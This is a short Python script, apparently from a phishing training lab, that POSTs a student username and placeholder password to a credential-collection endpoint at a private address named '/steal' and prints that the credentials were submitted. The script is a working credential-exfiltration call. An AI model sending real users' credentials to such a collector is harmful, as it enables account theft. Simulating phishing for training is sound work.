#!/usr/bin/env python3
import urllib.request
import urllib.parse

url = "http://192.168.10.50/steal"
data = urllib.parse.urlencode({"username":"student01","password":"Password123"}).encode()
req = urllib.request.Request(url, data=data, method="POST")
resp = urllib.request.urlopen(req, timeout=5)
print("phish_submit_status=%s" % resp.status)
print("phish_credentials_submitted=yes")
